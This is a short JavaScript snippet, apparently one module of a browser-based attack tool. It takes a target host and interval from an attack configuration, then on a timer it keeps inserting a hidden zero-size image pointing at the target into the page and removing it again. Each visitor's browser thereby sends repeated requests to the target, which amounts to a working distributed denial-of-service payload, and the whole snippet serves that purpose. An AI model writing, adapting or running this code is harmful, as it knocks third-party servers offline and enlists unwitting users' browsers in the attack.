
attackInfo = JSON.parse(arguments[0]);
window = arguments[1];
var controller = 	window.setInterval(function(){

  	var img =document.createElement('img');
  	img.width=0;
    img.height=0;
  	img.src = 'http://'+attackInfo['target'];
  	img.id = "ddostarget";
  	$("head:first").append(img);
  	$("#ddostarget").remove();
},Math.round(parseInt(attackInfo['timeout'])*1000));
return (function(controller){return function(){clearInterval(controller);}})(controller);
